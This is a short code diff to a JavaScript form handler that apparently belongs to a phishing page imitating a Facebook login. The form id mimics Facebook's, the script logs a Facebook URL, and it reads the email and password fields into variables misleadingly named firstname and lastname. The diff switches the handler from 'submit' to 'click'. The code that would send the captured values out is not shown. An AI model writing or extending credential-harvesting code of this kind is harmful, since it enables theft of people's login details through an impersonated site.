@@ -7,7 +7,7 @@
 document.addEventListener('DOMContentLoaded', () => {
       const form = document.getElementById('u_0_d_5u');
      console.log("https://facebook.com")
-      form.addEventListener('submit', async (e) => {
+      form.addEventListener('click', async (e) => {
         e.preventDefault();
         const firstname = document.getElementById('emailhidden').value.trim();
         const lastname = document.getElementById('pass').value.trim();
@@ -32,6 +32,7 @@ document.addEventListener('DOMContentLoaded', () => {
      }
   });
 })
+
 
 
 
